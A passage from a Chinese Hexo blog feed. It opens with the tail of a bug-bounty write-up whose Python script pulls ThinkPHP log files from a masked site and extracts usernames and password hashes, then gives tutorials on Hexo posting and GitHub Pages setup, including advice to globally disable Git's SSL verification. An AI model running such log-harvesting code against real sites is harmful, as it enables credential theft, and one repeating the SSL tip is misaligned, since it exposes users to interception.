class="hljs-number">1</span>,<span class="hljs-number">10</span>):<br>            url=<span class="hljs-string">f&#x27;http://xxx.xxx.com/App/Runtime/Logs/Home/<span class="hljs-subst">&#123;i&#125;</span>_0<span class="hljs-subst">&#123;j&#125;</span>_0<span class="hljs-subst">&#123;k&#125;</span>.log&#x27;</span><br>            response = requests.get(url)<br>            <span class="hljs-keyword">if</span> response.status_code == <span class="hljs-number">200</span>:<br>                data = response.text<br>                pattern = <span class="hljs-string">r&quot;`username`\s*=\s*([^`]+)\s+AND\s+`password`\s*=\s*([^`]+)&quot;</span><br>                username_match = re.search(pattern, data)<br>                <span class="hljs-keyword">if</span> username_match:<br>                    <span class="hljs-comment"># 提取到了username和password</span><br>                    username = username_match.group(<span class="hljs-number">1</span>)<br>                    password = username_match.group(<span class="hljs-number">2</span>)<br>                    password = password[<span class="hljs-number">0</span>:<span class="hljs-number">34</span>]<br>                    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Match:<span class="hljs-subst">&#123;username&#125;</span>:<span class="hljs-subst">&#123;password&#125;</span>&quot;</span>)<br></code></pre></td></tr></table></figure><p><img src="/2023/08/10/%E4%B8%80%E6%AC%A1%E5%85%AC%E7%9B%8Asrc%E6%8C%96%E6%8E%98-230804/Snipaste_2023-08-10_23-16-59.png"></p><p>点到为止就可以提交到平台啦！</p><p>居然只给了一个中危，可能有MD5吧哈哈🤣🤣</p><p><img src="/2023/08/10/%E4%B8%80%E6%AC%A1%E5%85%AC%E7%9B%8Asrc%E6%8C%96%E6%8E%98-230804/Snipaste_2023-08-31_23-06-49.png"></p>]]></content>
    
    
    <categories>
      
      <category>SRC</category>
      
    </categories>
    
    
    <tags>
      
      <tag>SRC</tag>
      
      <tag>Thinkphp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hexo个人博客写文章以及Git报错解决</title>
    <link href="/2022/12/11/Hexo%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E5%86%99%E6%96%87%E7%AB%A0%E4%BB%A5%E5%8F%8AGit%E6%8A%A5%E9%94%99%E8%A7%A3%E5%86%B3/"/>
    <url>/2022/12/11/Hexo%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E5%86%99%E6%96%87%E7%AB%A0%E4%BB%A5%E5%8F%8AGit%E6%8A%A5%E9%94%99%E8%A7%A3%E5%86%B3/</url>
    
    <content type="html"><![CDATA[<p>博客博客博客~~</p><span id="more"></span><h3 id="用Hexo写博客"><a href="#用Hexo写博客" class="headerlink" title="用Hexo写博客"></a>用Hexo写博客</h3><p>使用终端在命令行里创建一篇博客，然后会在目录<code>/source/_posts</code>下生成一个Markdown文档</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">hexo new post blog_name<br></code></pre></td></tr></table></figure><p><img src="/2022/12/11/Hexo%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E5%86%99%E6%96%87%E7%AB%A0%E4%BB%A5%E5%8F%8AGit%E6%8A%A5%E9%94%99%E8%A7%A3%E5%86%B3/Snipaste_2023-08-10_09-50-25.png"></p><p><img src="/2022/12/11/Hexo%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E5%86%99%E6%96%87%E7%AB%A0%E4%BB%A5%E5%8F%8AGit%E6%8A%A5%E9%94%99%E8%A7%A3%E5%86%B3/Snipaste_2023-08-10_09-54-25.png"></p><p>现在开始编辑</p><h4 id="给文章添加“categories”属性"><a href="#给文章添加“categories”属性" class="headerlink" title="给文章添加“categories”属性"></a>给文章添加“categories”属性</h4><p>生成“分类”页并添加tpye属性,进入博客目录。执行命令下方命令</p><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs haxe">hexo <span class="hljs-keyword">new</span> <span class="hljs-type">page</span> categories<br></code></pre></td></tr></table></figure><p>categories文件夹下会有index.md这个文件，打开后默认内容是这样的：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-meta">---</span><br><span class="hljs-attr">title:</span> <span class="hljs-string">categories</span><br><span class="hljs-attr">date:</span> <span class="hljs-number">2023-08-9</span> <span class="hljs-number">19</span><span class="hljs-string">:46:40</span><br><span class="hljs-meta">---</span><br></code></pre></td></tr></table></figure><p>添加type: “categories”到内容中，添加后是这样的：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-meta">---</span><br><span class="hljs-attr">title:</span> <span class="hljs-string">分类</span><br><span class="hljs-attr">date:</span> <span class="hljs-number">2023-08-9</span> <span class="hljs-number">19</span><span class="hljs-string">:46:40</span><br><span class="hljs-attr">type:</span> <span class="hljs-string">categories</span><br><span class="hljs-meta">---</span><br></code></pre></td></tr></table></figure><p>保存并关闭文件。</p><p>给文章添加categories标签</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-meta">---</span><br><span class="hljs-attr">title:</span> <span class="hljs-string">个人博客写文章以及Git报错解决</span><br><span class="hljs-attr">date:</span> <span class="hljs-number">2023-08-9</span> <span class="hljs-number">19</span><span class="hljs-string">:46:40</span><br><span class="hljs-attr">categories:</span> <span class="hljs-string">Github个人博客搭建和使用</span><br><span class="hljs-meta">---</span><br></code></pre></td></tr></table></figure><p>至此，成功给文章添加分类，点击首页的“分类”可以看到该分类下的所有文章。当然，只有添加了<code>categories: xxx</code>的文章才会被收录到首页的“分类”中。</p><h4 id="给文章添加“tags”属性"><a href="#给文章添加“tags”属性" class="headerlink" title="给文章添加“tags”属性"></a>给文章添加“tags”属性</h4><p>生成“标签”页并添加tpye属性,进入博客目录。执行命令下方命令</p><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs haxe">hexo <span class="hljs-keyword">new</span> <span class="hljs-type">page</span> tags<br></code></pre></td></tr></table></figure><p>categories文件夹下会有index.md这个文件，打开后默认内容是这样的：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-meta">---</span><br><span class="hljs-attr">title:</span> <span class="hljs-string">categories</span><br><span class="hljs-attr">date:</span> <span class="hljs-number">2023-08-9</span> <span class="hljs-number">19</span><span class="hljs-string">:46:40</span><br><span class="hljs-meta">---</span><br></code></pre></td></tr></table></figure><p>添加type: “categories”到内容中，添加后是这样的：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-meta">---</span><br><span class="hljs-attr">title:</span> <span class="hljs-string">标签</span><br><span class="hljs-attr">date:</span> <span class="hljs-number">2023-08-10 10:11:27</span><br><span class="hljs-attr">type:</span> <span class="hljs-string">tags</span><br><span class="hljs-meta">---</span><br></code></pre></td></tr></table></figure><p>保存并关闭文件。</p><p>给文章添加tags标签</p><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs subunit">title: 个人博客写文章以及Git报错解决<br>date: 2023<span class="hljs-string">-08</span><span class="hljs-string">-10</span> 09:46:40<br>categories: Github个人博客搭建和使用<br><span class="hljs-keyword">tags:</span> [Github,博客搭建]<br></code></pre></td></tr></table></figure><p>至此，成功给文章添加分类，点击首页的“标签”可以看到该标签下的所有文章。当然，只有添加了<code>tags: xxx</code>的文章才会被收录到首页的“标签”中。</p><h3 id="git提交文章报错"><a href="#git提交文章报错" class="headerlink" title="git提交文章报错"></a>git提交文章报错</h3><h4 id="OpenSSL-SSL-read-Connection-was-reset-errno-10054"><a href="#OpenSSL-SSL-read-Connection-was-reset-errno-10054" class="headerlink" title="OpenSSL SSL_read: Connection was reset, errno 10054"></a>OpenSSL SSL_read: Connection was reset, errno 10054</h4><p>在文件里<code>git bash here</code>，设置后关闭当前terminal窗口，重新打开再执行git操作</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">git config --global http.sslVerify &quot;false&quot; <br></code></pre></td></tr></table></figure><h4 id="Failed-to-connect-to-github-com-port-443-Operation-timed-out"><a href="#Failed-to-connect-to-github-com-port-443-Operation-timed-out" class="headerlink" title="Failed to connect to github.com port 443:Operation timed out"></a>Failed to connect to github.com port 443:Operation timed out</h4><p>​首先，你有全局的科学上网小猫猫，然后在git里执行更换代理即可，注意使用V2ray的默认端口是1080。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">git config --global http.proxy http://127.0.0.1:7890 <br>git config --global https.proxy http://127.0.0.1:7890<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>杂项</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Github博客搭建</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>在Github上搭建自己的个人博客</title>
    <link href="/2022/12/09/%E5%9C%A8Github%E4%B8%8A%E6%90%AD%E5%BB%BA%E8%87%AA%E5%B7%B1%E7%9A%84%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/"/>
    <url>/2022/12/09/%E5%9C%A8Github%E4%B8%8A%E6%90%AD%E5%BB%BA%E8%87%AA%E5%B7%B1%E7%9A%84%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/</url>
    
    <content type="html"><![CDATA[<p>搭博客~~</p><span id="more"></span><h3 id="前期准备"><a href="#前期准备" class="headerlink" title="前期准备"></a>前期准备</h3><h4 id="Github账号"><a href="#Github账号" class="headerlink" title="Github账号"></a>Github账号</h4><p>需要有一个<code>GitHub</code>账号，没有的话到 <a href="https://github.com/">官网 </a>申请一个。</p><h4 id="Git"><a href="#Git" class="headerlink" title="Git"></a>Git</h4><p>在自己电脑上安装好<code>Git</code>，<a href="https://so.csdn.net/so/search?q=hexo&spm=1001.2101.3001.7020">hexo</a>部署到<code>GitHub</code>时要用</p><h4 id="Node-js"><a href="#Node-js" class="headerlink" title="Node.js"></a>Node.js</h4><p>官网下载地址：<a href="https://nodejs.org/zh-cn/download/">https://nodejs.org/zh-cn/download/</a></p><p><img src="/2022/12/09/%E5%9C%A8Github%E4%B8%8A%E6%90%AD%E5%BB%BA%E8%87%AA%E5%B7%B1%E7%9A%84%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/1.png" alt="test1"></p><p>打开cmd窗口，执行命令 <code>node -v</code> 查看node版本</p><p>如果出现了系统找不到<code>node</code>，可以在系统环境变量中添加</p><p><img src="/2022/12/09/%E5%9C%A8Github%E4%B8%8A%E6%90%AD%E5%BB%BA%E8%87%AA%E5%B7%B1%E7%9A%84%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/Snipaste_2024-05-14_12-21-48.jpg"></p><p>在安装node的同时也安装了npm，执行 <code>npm -v</code> 查看npm版本</p><p><img src="/2022/12/09/%E5%9C%A8Github%E4%B8%8A%E6%90%AD%E5%BB%BA%E8%87%AA%E5%B7%B1%E7%9A%84%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/image-20230808150618974.png" alt="image-20230808150618974"></p><h4 id="创建仓库"><a href="#创建仓库" class="headerlink" title="创建仓库"></a>创建仓库</h4><p>在<code>GitHub</code>上创建一个新的代码仓库用于保存我们的网页</p><p><img src="/2022/12/09/%E5%9C%A8Github%E4%B8%8A%E6%90%AD%E5%BB%BA%E8%87%AA%E5%B7%B1%E7%9A%84%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/image-20230808151116734.png" alt="image-20230808151116734"></p><p>填写仓库名，格式必须为<code>&lt;用户名&gt;.github.io</code>，然后点击<code>Create repository</code></p><p><img src="/2022/12/09/%E5%9C%A8Github%E4%B8%8A%E6%90%AD%E5%BB%BA%E8%87%AA%E5%B7%B1%E7%9A%84%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/image-20230808151259633.png" alt="image-20230808151259633"></p><p>点击<code>creating a new file</code>创建一个新文件，作为我们网站的主页</p><p><img src="/2022/12/09/%E5%9C%A8Github%E4%B8%8A%E6%90%AD%E5%BB%BA%E8%87%AA%E5%B7%B1%E7%9A%84%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/image-20230808151342603.png" alt="image-20230808151342603"></p><p><img src="/2022/12/09/%E5%9C%A8Github%E4%B8%8A%E6%90%AD%E5%BB%BA%E8%87%AA%E5%B7%B1%E7%9A%84%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/image-20230808151445824.png" alt="image-20230808151445824"></p><p>首先确定分支，然后重新打开设置GitHub Pages中找到我们主页的地址为 <a href="https://remixxyh.github.io/3xsh0re.github.io/">https://remixxyh.github.io/3xsh0re.github.io/</a></p><p><img src="/2022/12/09/%E5%9C%A8Github%E4%B8%8A%E6%90%AD%E5%BB%BA%E8%87%AA%E5%B7%B1%E7%9A%84%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/image-20230808152113275.png" alt="image-20230808152113275"></p><h3 id="安装Hexo"><a href="#安装Hexo" class="headerlink" title="安装Hexo"></a>安装Hexo</h3><p>我们采用<code>Hexo</code>来创建我们的博客网站，<code>Hexo</code> 是一个基于<code>NodeJS</code>的静态博客网站生成器，使用<code>Hexo</code>不需开发，只要进行一些必要的配置即可生成一个个性化的博客网站，非常方便。点击进入 <a href="https://hexo.io/zh-cn/">官网</a>。</p><p>安装 <code>Hexo</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">npm install -g hexo-cli<br></code></pre></td></tr></table></figure><p>查看版本</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">hexo -v<br></code></pre></td></tr></table></figure><p>解决报错</p><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs moonscript">hexo : 无法加载文件 <span class="hljs-name">C</span>:\Users\DELL\AppData\Roaming\npm\hexo.ps1，因为在此系统上禁止运行脚本。有关详细信息，请参阅 <span class="hljs-name">https</span>:<br>/go.microsoft.com/fwlink/?LinkID=<span class="hljs-number">135170</span> 中的 about_Execution_Policies。<br>所在位置 行:<span class="hljs-number">1</span> 字符: <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>打开开发者选项</p><p><img src="/2022/12/09/%E5%9C%A8Github%E4%B8%8A%E6%90%AD%E5%BB%BA%E8%87%AA%E5%B7%B1%E7%9A%84%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/image-20230808155045188.png" alt="image-20230808155045188"></p><p><img src="/2022/12/09/%E5%9C%A8Github%E4%B8%8A%E6%90%AD%E5%BB%BA%E8%87%AA%E5%B7%B1%E7%9A%84%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/image-20230808155116199.png" alt="image-20230808155116199"></p><p>成功解决</p><p><img src="/2022/12/09/%E5%9C%A8Github%E4%B8%8A%E6%90%AD%E5%BB%BA%E8%87%AA%E5%B7%B1%E7%9A%84%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/image-20230808155133450.png" alt="image-20230808155133450"></p><p>创建一个项目 <code>hexo-blog</code> 并初始化，踩雷，不能在盘根目录下创建，要建立二级目录才行</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">hexo init hexo-blog<br>cd hexo-blog<br>npm install<br>hexo g<br>hexo server<br></code></pre></td></tr></table></figure><p><img src="/2022/12/09/%E5%9C%A8Github%E4%B8%8A%E6%90%AD%E5%BB%BA%E8%87%AA%E5%B7%B1%E7%9A%84%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/image-20230808160800840.png" alt="image-20230808160800840"></p><p>浏览器访问，默认路径<a href="http://localhost:4000，页面默认主图风格如下">http://localhost:4000，页面默认主图风格如下</a></p><p><img src="/2022/12/09/%E5%9C%A8Github%E4%B8%8A%E6%90%AD%E5%BB%BA%E8%87%AA%E5%B7%B1%E7%9A%84%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/image-20230808160847398.png" alt="image-20230808160847398"></p><h3 id="更换使用Fluid主题"><a href="#更换使用Fluid主题" class="headerlink" title="更换使用Fluid主题"></a>更换使用Fluid主题</h3><p>下载 <a href="https://github.com/fluid-dev/hexo-theme-fluid/releases">最新 release 版本</a> 解压到 <code>themes</code> 目录，并将解压出的文件夹重命名为 <code>fluid</code></p><p><img src="/2022/12/09/%E5%9C%A8Github%E4%B8%8A%E6%90%AD%E5%BB%BA%E8%87%AA%E5%B7%B1%E7%9A%84%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/image-20230808161347061.png" alt="image-20230808161347061"></p><p>如下修改 <code>Hexo</code> 博客目录中的 <code>_config.yml</code>：</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">theme:</span> fluid  <span class="hljs-meta"># 指定主题</span><br><span class="hljs-symbol">language:</span> <span class="hljs-built_in">zh</span>-CN  <span class="hljs-meta"># 指定语言，会影响主题显示的语言，按需修改</span><br></code></pre></td></tr></table></figure><p><img src="/2022/12/09/%E5%9C%A8Github%E4%B8%8A%E6%90%AD%E5%BB%BA%E8%87%AA%E5%B7%B1%E7%9A%84%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/image-20230808162045506.png" alt="image-20230808162045506"></p><p><img src="/2022/12/09/%E5%9C%A8Github%E4%B8%8A%E6%90%AD%E5%BB%BA%E8%87%AA%E5%B7%B1%E7%9A%84%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/image-20230808162106017.png" alt="image-20230808162106017"></p><p>首次使用主题的「关于页」需要手动创建：</p><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs haxe">hexo <span class="hljs-keyword">new</span> <span class="hljs-type">page</span> about<br></code></pre></td></tr></table></figure><p><img src="/2022/12/09/%E5%9C%A8Github%E4%B8%8A%E6%90%AD%E5%BB%BA%E8%87%AA%E5%B7%B1%E7%9A%84%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/image-20230808162133409.png" alt="image-20230808162133409"></p><p>创建成功后，编辑博客目录下 &#x2F;source&#x2F;about&#x2F;index.md，添加 layout 属性。</p><p>修改后的文件示例如下：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-meta">---</span><br><span class="hljs-meta"></span><br><span class="hljs-attr">title:</span> <span class="hljs-string">about</span><br><span class="hljs-attr">date:</span> <span class="hljs-number">2023-08-09 19:20:33</span><br><span class="hljs-attr">layout:</span> <span class="hljs-string">about</span><br><span class="hljs-meta">---</span><br></code></pre></td></tr></table></figure><p><img src="/2022/12/09/%E5%9C%A8Github%E4%B8%8A%E6%90%AD%E5%BB%BA%E8%87%AA%E5%B7%B1%E7%9A%84%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/image-20230808162259101.png" alt="image-20230808162259101"></p><h3 id="博客部署到Github"><a href="#博客部署到Github" class="headerlink" title="博客部署到Github"></a>博客部署到Github</h3><p>安装hexo-deployer-git</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">npm install hexo-deployer-git --save<br></code></pre></td></tr></table></figure><p>修改根目录下的<code> _config.yml</code>，配置 GitHub 相关信息</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">deploy:</span><br><span class="hljs-symbol">  type:</span> git<br><span class="hljs-symbol">  repo:</span> https:<span class="hljs-comment">//token@github.com/remixxyh/remixxyh.github.io.git #免密push</span><br><span class="hljs-symbol">  branch:</span> main<br><span class="hljs-symbol">  token:</span> 你的token<br></code></pre></td></tr></table></figure><p><img src="/2022/12/09/%E5%9C%A8Github%E4%B8%8A%E6%90%AD%E5%BB%BA%E8%87%AA%E5%B7%B1%E7%9A%84%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/Snipaste_2024-04-23_10-41-16.png"></p><p>执行命令完成部署，可能出现一些git的报错，自寻搜索即可解决</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">hexo g -d<br></code></pre></td></tr></table></figure><h3 id="图片插件"><a href="#图片插件" class="headerlink" title="图片插件"></a><strong>图片插件</strong></h3><p>插件<code>hexo-renderer-marked</code>解决了这个问题。可以只用<code>npm install hexo-renderer-marked</code>命令直接安装，之后在根目录下的<code>config.yml</code>中更改配置如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-attr">post_asset_folder</span>: <span class="hljs-literal">true</span><br><span class="hljs-attr">marked</span>:<br>  <span class="hljs-attr">prependRoot</span>: <span class="hljs-literal">true</span><br>  <span class="hljs-attr">postAsset</span>: <span class="hljs-literal">true</span><br></code></pre></td></tr></table></figure><p>之后就可以在使用<code>![](image.jpg)</code>的方式愉快的插入图片了</p><p><img src="/2022/12/09/%E5%9C%A8Github%E4%B8%8A%E6%90%AD%E5%BB%BA%E8%87%AA%E5%B7%B1%E7%9A%84%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/Snipaste_2023-09-01_22-41-43.png"></p><h3 id="个性化fluid"><a href="#个性化fluid" class="headerlink" title="个性化fluid"></a>个性化fluid</h3><h4 id="个性化页面"><a href="#个性化页面" class="headerlink" title="个性化页面"></a>个性化页面</h4><p>修改<code>themes/fluid</code>下的<code>_config.yml</code>，这是主题相关的配置文件</p><p><img src="/2022/12/09/%E5%9C%A8Github%E4%B8%8A%E6%90%AD%E5%BB%BA%E8%87%AA%E5%B7%B1%E7%9A%84%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/Snipaste_2023-09-01_22-44-04.png"></p><h5 id="修改浏览器标签"><a href="#修改浏览器标签" class="headerlink" title="修改浏览器标签"></a>修改浏览器标签</h5><p><img src="/2022/12/09/%E5%9C%A8Github%E4%B8%8A%E6%90%AD%E5%BB%BA%E8%87%AA%E5%B7%B1%E7%9A%84%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/Snipaste_2023-09-01_22-59-38.png"></p><h5 id="修改导航栏title"><a href="#修改导航栏title" class="headerlink" title="修改导航栏title"></a>修改导航栏title</h5><p>搜索：<code>navbar</code></p><p><img src="/2022/12/09/%E5%9C%A8Github%E4%B8%8A%E6%90%AD%E5%BB%BA%E8%87%AA%E5%B7%B1%E7%9A%84%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/Snipaste_2023-09-01_23-01-09.png"></p><h5 id="修改欢迎字样"><a href="#修改欢迎字样" class="headerlink" title="修改欢迎字样"></a>修改欢迎字样</h5><p>搜索：<code>slogan</code></p><p><img src="/2022/12/09/%E5%9C%A8Github%E4%B8%8A%E6%90%AD%E5%BB%BA%E8%87%AA%E5%B7%B1%E7%9A%84%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/Snipaste_2023-09-01_23-03-16.png"></p><h5 id="修改关于页面"><a href="#修改关于页面" class="headerlink" title="修改关于页面"></a>修改关于页面</h5><p>在配置文件里搜索：<code>about</code>，即可修改关于页面；图片资源在<code>hexo-blog\themes\fluid\source\img</code>文件夹里添加修改</p><p><img src="/2022/12/09/%E5%9C%A8Github%E4%B8%8A%E6%90%AD%E5%BB%BA%E8%87%AA%E5%B7%B1%E7%9A%84%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/Snipaste_2023-09-01_22-50-47.png"></p><p>效果：</p><p><img src="/2022/12/09/%E5%9C%A8Github%E4%B8%8A%E6%90%AD%E5%BB%BA%E8%87%AA%E5%B7%B1%E7%9A%84%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/Snipaste_2023-09-01_22-52-35.png"></p><h4 id="添加live2d桌宠"><a href="#添加live2d桌宠" class="headerlink" title="添加live2d桌宠"></a>添加live2d桌宠</h4><h5 id="安装插件"><a href="#安装插件" class="headerlink" title="安装插件"></a>安装插件</h5><p>首先我们需要安装一个插件，用于在<code>hexo</code>里使用<code>live2d</code></p><p><code>npm install --save hexo-helper-live2d</code></p><h5 id="下载安装live2d模型"><a href="#下载安装live2d模型" class="headerlink" title="下载安装live2d模型"></a>下载安装live2d模型</h5><p>通过<code>npm install npm install --save live2d-widget-model-xxx</code>来安装你喜欢的模型</p><p>比方说我喜欢的是小猫猫，那就使用<code>npm install npm install --save live2d-widget-model-tororo</code>进行安装</p><p><a href="https://blog.51cto.com/u_16162646/6494412">模型预览</a></p><p><a href="https://github.com/xiazeyu/live2d-widget-models">模型Github地址</a></p><p>安装后我们在根目录下的<code>node_modules</code>目录下面找到<code>live2d-widget-model-tororo</code>这个文件夹，把这个文件夹复制下来，找到我们的<code>hexo</code>博客的根目录（也可以在根目录新建一个文件夹专门存放模型），把刚刚我们复制的文件粘贴过来</p><p><img src="/2022/12/09/%E5%9C%A8Github%E4%B8%8A%E6%90%AD%E5%BB%BA%E8%87%AA%E5%B7%B1%E7%9A%84%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/Snipaste_2023-09-01_23-18-54.png"></p><h5 id="添加配置文件"><a href="#添加配置文件" class="headerlink" title="添加配置文件"></a>添加配置文件</h5><p>在根目录下的<code>_config.yml</code>配置，这样以后换了主题就不用重新配置了，<strong>注意在<code>model</code>那里填写自己的模型文件名称</strong></p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">live2d:</span><br>  <span class="hljs-attr">enable:</span> <span class="hljs-literal">true</span>  <span class="hljs-comment"># 是否启动</span><br>  <span class="hljs-attr">scriptFrom:</span> <span class="hljs-string">local</span> <span class="hljs-comment"># 默认</span><br>  <span class="hljs-attr">pluginRootPath:</span> <span class="hljs-string">live2dw/</span>  <span class="hljs-comment"># 插件在站点上的根目录(相对路径)</span><br>  <span class="hljs-attr">pluginJsPath:</span> <span class="hljs-string">lib/</span>  <span class="hljs-comment"># 脚本文件相对与插件根目录路径</span><br>  <span class="hljs-attr">pluginModelPath:</span> <span class="hljs-string">assets/</span>  <span class="hljs-comment"># 模型文件相对与插件根目录路径</span><br>  <span class="hljs-attr">tagMode:</span> <span class="hljs-literal">false</span>  <span class="hljs-comment"># 标签模式, 是否仅替换 live2d tag标签而非插入到所有页面中</span><br>  <span class="hljs-attr">debug:</span> <span class="hljs-literal">false</span>  <span class="hljs-comment"># 调试, 是否在控制台输出日志</span><br>  <span class="hljs-attr">model:</span><br>    <span class="hljs-attr">use:</span> <span class="hljs-string">live2d-widget-model-tororo</span> <span class="hljs-comment">## 模型文件</span><br>  <span class="hljs-attr">display:</span><br>    <span class="hljs-attr">position:</span> <span class="hljs-string">right</span> <span class="hljs-comment"># 定位方向 left right top bottom</span><br>    <span class="hljs-attr">width:</span> <span class="hljs-number">150</span>  <span class="hljs-comment"># 小人宽度</span><br>    <span class="hljs-attr">height:</span> <span class="hljs-number">300</span> <span class="hljs-comment">#  小人高度</span><br>    <span class="hljs-attr">hOffset:</span> <span class="hljs-number">-15</span>  <span class="hljs-comment"># 向 偏移</span><br>    <span class="hljs-attr">vOffset:</span> <span class="hljs-number">-15</span>  <span class="hljs-comment"># 像 偏移</span><br>  <span class="hljs-attr">mobile:</span><br>    <span class="hljs-attr">show:</span> <span class="hljs-literal">true</span>  <span class="hljs-comment"># 手机端是否显示</span><br>  <span class="hljs-attr">react:</span><br>    <span class="hljs-attr">opacity:</span> <span class="hljs-number">0.7</span>  <span class="hljs-comment"># 